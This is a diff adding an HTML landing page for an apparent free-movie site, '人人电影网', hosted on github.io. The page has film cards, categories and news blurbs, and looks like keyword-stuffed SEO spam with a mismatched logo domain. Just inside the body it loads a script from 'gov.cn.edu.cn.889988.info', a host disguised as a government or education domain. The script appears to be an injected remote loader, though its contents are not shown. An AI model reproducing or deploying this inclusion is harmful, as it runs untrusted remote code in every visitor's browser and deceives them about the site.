@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="keywords" content="人人电影网,人人电影网在线观看,人人电影网高清免费,renrendianyingwang-zh.github.io">
+<meta name="description" content="人人电影网(renrendianyingwang-zh.github.io)——人人都能看的免费高清电影网站，汇集院线大片、热播剧集与经典老片，每日精选更新，打开即看无需等待。">
+<title>人人电影网 - 人人都能看的免费高清电影站 | renrendianyingwang-zh.github.io</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+:root{
+  --bg:#fffaf5;
+  --ink:#2b2118;
+  --warm:#ff6b35;
+  --warm2:#ffa940;
+  --deep:#c0392b;
+  --muted:#8a7f73;
+  --line:#f0e6dc;
+  --card:#fff;
+}
+html{scroll-behavior:smooth;}
+body{font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei",sans-serif;background:var(--bg);color:var(--ink);line-height:1.8;-webkit-font-smoothing:antialiased;}
+a{color:inherit;text-decoration:none;}
+.wrap{max-width:1160px;margin:0 auto;padding:0 24px;}
+
+/* top */
+.topbar{background:#3a2b20;color:#f0e0d0;font-size:13px;padding:8px 0;}
+.topbar .wrap{display:flex;justify-content:space-between;flex-wrap:wrap;gap:10px;}
+.topbar a:hover{color:var(--warm2);}
+header{background:var(--card);border-bottom:3px solid var(--warm);position:sticky;top:0;z-index:50;}
+.nav{display:flex;align-items:center;justify-content:space-between;padding:14px 0;}
+.logo{font-size:26px;font-weight:900;}
+.logo small{color:var(--warm);}
+.logo span{color:var(--muted);font-size:13px;font-weight:400;margin-left:8px;}
+.nav-links{display:flex;gap:2px;list-style:none;}
+.nav-links a{padding:10px 18px;border-radius:8px;font-size:15px;font-weight:600;transition:.2s;}
+.nav-links a:hover{background:var(--bg);color:var(--warm);}
+.menu-btn{display:none;background:none;border:none;font-size:28px;color:var(--warm);cursor:pointer;}
+
+/* hero */
+.hero{background:linear-gradient(160deg,#fff1e6,#ffe3cc);padding:70px 0 60px;border-bottom:1px solid var(--line);}
+.hero .wrap{display:grid;grid-template-columns:1.3fr .7fr;gap:50px;align-items:center;}
+.hero h1{font-size:46px;line-height:1.25;font-weight:900;margin-bottom:20px;}
+.hero h1 u{text-decoration:none;color:var(--warm);}
+.hero>p{font-size:17px;color:#6b5d50;margin-bottom:26px;}
+.hero-cta{display:flex;gap:14px;flex-wrap:wrap;}
+.btn{background:var(--warm);color:#fff;padding:14px 32px;border-radius:10px;font-weight:700;font-size:16px;transition:.3s;border:none;cursor:pointer;}
+.btn:hover{background:var(--deep);transform:translateY(-2px);}
+.btn-ghost{background:transparent;color:var(--warm);border:2px solid var(--warm);padding:14px 30px;border-radius:10px;font-weight:700;font-size:16px;cursor:pointer;}
+.btn-ghost:hover{background:var(--warm);color:#fff;}
+.hero-box{background:#fff;border:2px dashed var(--warm2);border-radius:16px;padding:26px;}
+.hero-box h3{color:var(--warm);margin-bottom:16px;font-size:18px;}
+.hero-box ul{list-style:none;}
+.hero-box li{padding:10px 0;border-bottom:1px dotted var(--line);display:flex;justify-content:space-between;font-size:15px;}
+.hero-box li:last-child{border-bottom:none;}
+.hero-box li b{color:var(--deep);}
+
+/* section */
+section{padding:60px 0;}
+.sec-head{display:flex;align-items:baseline;justify-content:space-between;border-bottom:2px solid var(--ink);padding-bottom:12px;margin-bottom:34px;gap:16px;flex-wrap:wrap;}
+.sec-head h2{font-size:30px;font-weight:900;}
+.sec-head h2 small{color:var(--warm);font-size:20px;margin-right:8px;}
+.sec-head a{color:var(--muted);font-size:14px;font-weight:600;}
+.sec-head a:hover{color:var(--warm);}
+
+/* film list */
+.list{display:grid;grid-template-columns:repeat(4,1fr);gap:24px;}
+.movie{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:14px;transition:.3s;}
+.movie:hover{border-color:var(--warm);box-shadow:0 12px 30px rgba(255,107,53,.18);transform:translateY(-5px);}
+.thumb{height:190px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:60px;margin-bottom:14px;position:relative;}
+.thumb i{position:absolute;top:10px;right:10px;background:rgba(0,0,0,.55);color:#fff;font-style:normal;font-size:12px;padding:4px 10px;border-radius:6px;}
+.movie h4{font-size:17px;margin-bottom:4px;}
+.movie p{font-size:13px;color:var(--muted);margin-bottom:10px;}
+.movie .row{display:flex;justify-content:space-between;font-size:13px;}
+.movie .row b{color:var(--warm);}
+
+/* channel */
+.ch-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:18px;}
+.ch{background:var(--card);border-left:6px solid var(--warm);border-radius:10px;padding:22px 24px;display:flex;align-items:center;gap:18px;transition:.3s;}
+.ch:hover{background:var(--warm);color:#fff;}
+.ch .ico{font-size:40px;flex:0 0 auto;}
+.ch h4{font-size:19px;margin-bottom:3px;}
+.ch p{font-size:13px;opacity:.8;}
+
+/* news */
+.news-wrap{display:grid;grid-template-columns:repeat(3,1fr);gap:24px;}
+.news-card{background:var(--card);border:1px solid var(--line);border-radius:12px;overflow:hidden;transition:.3s;}
+.news-card:hover{border-color:var(--warm);}
+.news-card .cap{height:120px;display:flex;align-items:center;justify-content:center;font-size:44px;}
+.news-card .bd{padding:20px;}
+.news-card .date{font-size:12px;color:var(--warm);font-weight:600;}
+.news-card h4{font-size:17px;margin:8px 0;line-height:1.5;}
+.news-card p{font-size:13px;color:var(--muted);}
+
+/* about */
+.about{background:var(--ink);color:#f0e0d0;border-radius:20px;padding:50px;}
+.about .wrap2{display:grid;grid-template-columns:1fr 1fr;gap:44px;align-items:center;}
+.about h2{color:#fff;font-size:28px;margin-bottom:18px;}
+.about p{margin-bottom:12px;}
+.about .nums{display:grid;grid-template-columns:1fr 1fr;gap:16px;}
+.num{background:rgba(255,107,53,.12);border:1px solid rgba(255,107,53,.3);border-radius:14px;padding:24px;text-align:center;}
+.num b{display:block;font-size:34px;color:var(--warm2);font-weight:900;}
+.num span{font-size:13px;color:#d0c0b0;}
+
+/* footer */
+footer{background:#3a2b20;color:#d0c0b0;margin-top:60px;padding:50px 0 26px;}
+.foot{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:32px;margin-bottom:34px;}
+.foot h5{color:#fff;font-size:16px;margin-bottom:16px;}
+.foot ul{list-style:none;}
+.foot li{margin-bottom:10px;}
+.foot a{color:#b0a090;font-size:14px;}
+.foot a:hover{color:var(--warm2);}
+.copy{text-align:center;color:#8a7a6a;font-size:13px;border-top:1px solid rgba(255,255,255,.1);padding-top:24px;}
+
+@media(max-width:900px){
+  .hero .wrap,.about .wrap2{grid-template-columns:1fr;}
+  .hero-box{display:none;}
+  .list,.news-wrap{grid-template-columns:repeat(2,1fr);}
+  .hero h1{font-size:34px;}
+  .ch-grid{grid-template-columns:1fr;}
+  .foot{grid-template-columns:1fr 1fr;}
+}
+@media(max-width:640px){
+  section{padding:44px 0;}
+  .nav-links{position:absolute;top:100%;left:0;right:0;background:#fff;flex-direction:column;padding:16px;border-bottom:3px solid var(--warm);transform:scaleY(0);transform-origin:top;transition:.3s;}
+  .nav-links.open{transform:scaleY(1);}
+  .menu-btn{display:block;}
+  .hero h1{font-size:28px;}
+  .list,.news-wrap{grid-template-columns:1fr;}
+  .foot{grid-template-columns:1fr;}
+  .logo span{display:none;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<div class="topbar">
+  <div class="wrap">
+    <span>🎬 欢迎来到人人电影网 · 每天发现一部好电影</span>
+    <span><a href="#">收藏本站</a> · <a href="#">投稿合作</a></span>
+  </div>
+</div>
+
+<header>
+  <div class="wrap nav">
+    <div class="logo">人人<small>电影网</small><span>sansandianyingwang-zh.github.io</span></div>
+    <button class="menu-btn" onclick="document.getElementById('nav').classList.toggle('open')">≡</button>
+    <ul class="nav-links" id="nav">
+      <li><a href="#">首页</a></li>
+      <li><a href="#films">院线大片</a></li>
+      <li><a href="#channel">分类导航</a></li>
+      <li><a href="#news">影坛快讯</a></li>
+      <li><a href="#about">关于本站</a></li>
+    </ul>
+  </div>
+</header>
+
+<section class="hero">
+  <div class="wrap">
+    <div>
+      <h1>人人电影网<br>好电影 <u>人人都能看</u></h1>
+      <p>人人电影网（https://renrendianyingwang-zh.github.io）精选十万部高清电影，从院线热映到经典老片，打开网页即看，无需注册、无需等待。</p>
+      <div class="hero-cta">
+        <button class="btn" onclick="window.location.href='#'">立即免费观看</button>
+        <button class="btn-ghost" onclick="window.location.href='#films'">浏览全部影片</button>
+      </div>
+    </div>
+    <div class="hero-box">
+      <h3>📺 今日推荐片单</h3>
+      <ul>
+        <li>破晓之战 <b>9.3</b></li>
+        <li>城南旧事 <b>9.1</b></li>
+        <li>星际归途 <b>8.8</b></li>
+        <li>周末狂欢 <b>8.5</b></li>
+        <li>沉默证人 <b>8.7</b></li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<section id="films">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2><small>01</small>院线大片</h2>
+      <a href="#">查看全部 ›</a>
+    </div>
+    <div class="list">
+      <div class="movie"><div class="thumb">🏹<i>动作</i></div><h4>破晓之战</h4><p>2026 · 中国香港 · 128分钟</p><div class="row"><span>豆瓣高分</span><b>9.3</b></div></div>
+      <div class="movie"><div class="thumb">🚀<i>科幻</i></div><h4>星际归途</h4><p>2026 · 美国 · 145分钟</p><div class="row"><span>IMAX巨制</span><b>8.8</b></div></div>
+      <div class="movie"><div class="thumb">😂<i>喜剧</i></div><h4>周末狂欢</h4><p>2026 · 中国大陆 · 102分钟</p><div class="row"><span>轻松解压</span><b>8.5</b></div></div>
+      <div class="movie"><div class="thumb">🕵️<i>悬疑</i></div><h4>沉默证人</h4><p>2026 · 韩国 · 119分钟</p><div class="row"><span>反转不断</span><b>8.7</b></div></div>
+      <div class="movie"><div class="thumb">💑<i>爱情</i></div><h4>城南旧事</h4><p>2026 · 日本 · 110分钟</p><div class="row"><span>治愈催泪</span><b>9.1</b></div></div>
+      <div class="movie"><div class="thumb">🐉<i>奇幻</i></div><h4>山海行者</h4><p>2026 · 中国大陆 · 136分钟</p><div class="row"><span>视效炸裂</span><b>8.6</b></div></div>
+      <div class="movie"><div class="thumb">🎭<i>文艺</i></div><h4>慢车去巴黎</h4><p>2026 · 法国 · 98分钟</p><div class="row"><span>光影诗意</span><b>8.4</b></div></div>
+      <div class="movie"><div class="thumb">👻<i>惊悚</i></div><h4>第七扇门</h4><p>2026 · 泰国 · 94分钟</p><div class="row"><span>胆量挑战</span><b>8.2</b></div></div>
+    </div>
+  </div>
+</section>
+
+<section id="channel">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2><small>02</small>分类导航</h2>
+      <a href="#">更多分类 ›</a>
+    </div>
+    <div class="ch-grid">
+      <div class="ch"><div class="ico">💥</div><div><h4>动作大片</h4><p>硬核打斗、飞车追逐、热血营救</p></div></div>
+      <div class="ch"><div class="ico">😄</div><div><h4>喜剧搞笑</h4><p>合家欢、黑色幽默、解压神片</p></div></div>
+      <div class="ch"><div class="ico">💘</div><div><h4>爱情文艺</h4><p>青春校园、都市情感、治愈系</p></div></div>
+      <div class="ch"><div class="ico">👽</div><div><h4>科幻奇幻</h4><p>星际探索、时间旅行、未来世界</p></div></div>
+      <div class="ch"><div class="ico">🧩</div><div><h4>悬疑推理</h4><p>烧脑谜题、层层反转、细思极恐</p></div></div>
+      <div class="ch"><div class="ico">🎨</div><div><h4>动画国漫</h4><p>合家欢动画、国漫精品、经典重映</p></div></div>
+    </div>
+  </div>
+</section>
+
+<section id="news">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2><small>03</small>影坛快讯</h2>
+      <a href="#">更多资讯 ›</a>
+    </div>
+    <div class="news-wrap">
+      <div class="news-card"><div class="cap">🎥</div><div class="bd"><div class="date">2026.09.29 · 独家报道</div><h4>《破晓之战》票房破30亿，成年度现象级动作片</h4><p>人人电影网带你复盘这部港式动作片的成功密码。</p></div></div>
+      <div class="news-card"><div class="cap">📽️</div><div class="bd"><div class="date">2026.09.26 · 片单推荐</div><h4>秋日宅家片单：10部治愈系电影陪你过周末</h4><p>不想出门？这份清单帮你轻松选片。</p></div></div>
+      <div class="news-card"><div class="cap">🎞️</div><div class="bd"><div class="date">2026.09.23 · 行业观察</div><h4>从胶片到数字：电影拍摄技术的百年演进</h4><p>一部影像技术的简史，看懂今天的每一帧画面。</p></div></div>
+    </div>
+  </div>
+</section>
+
+<section id="about">
+  <div class="wrap about">
+    <div class="wrap2">
+      <div>
+        <h2>关于人人电影网</h2>
+        <p>人人电影网（https://renrendianyingwang-zh.github.io）是一个面向所有影迷的免费电影信息分享平台，我们相信好电影应该人人都能轻松找到、自由欣赏。</p>
+        <p>平台每日精选院线新片、经典老片与高分佳作，覆盖动作、喜剧、爱情、科幻、悬疑、动画等多种类型，并提供专业的影评解读与行业动态，让每一次观影都有收获。</p>
+        <button class="btn" style="margin-top:10px;" onclick="window.location.href='#'">了解我们使用指南</button>
+      </div>
+      <div class="nums">
+        <div class="num"><b>100,000+</b><span>精选影片</span></div>
+        <div class="num"><b>500+</b><span>每日更新</span></div>
+        <div class="num"><b>1080P</b><span>高清画质</span></div>
+        <div class="num"><b>0</b><span>注册费用</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div class="foot">
+      <div>
+        <div class="logo" style="color:#fff;">人人<small style="color:var(--warm2);">电影网</small></div>
+        <p style="margin-top:14px;font-size:14px;">人人电影网(renrendianyingwang-zh.github.io)——人人都能看的免费高清电影站，发现每一部值得一看的好电影。</p>
+      </div>
+      <div>
+        <h5>影片频道</h5>
+        <ul><li><a href="#">动作电影</a></li><li><a href="#">喜剧电影</a></li><li><a href="#">爱情电影</a></li><li><a href="#">科幻电影</a></li></ul>
+      </div>
+      <div>
+        <h5>观影服务</h5>
+        <ul><li><a href="#">新片速递</a></li><li><a href="#">高分榜单</a></li><li><a href="#">观影指南</a></li><li><a href="#">常见问题</a></li></ul>
+      </div>
+      <div>
+        <h5>关于本站</h5>
+        <ul><li><a href="#">关于我们</a></li><li><a href="#">投稿合作</a></li><li><a href="#">隐私声明</a></li><li><a href="#">联系我们</a></li></ul>
+      </div>
+    </div>
+    <div class="copy">© 2026 人人电影网 · 网站网址：https://renrendianyingwang-zh.github.io · 本站内容仅供影视信息交流与分享，版权归原作者及发行方所有</div>
+  </div>
+</footer>
+
+</body>
+</html>
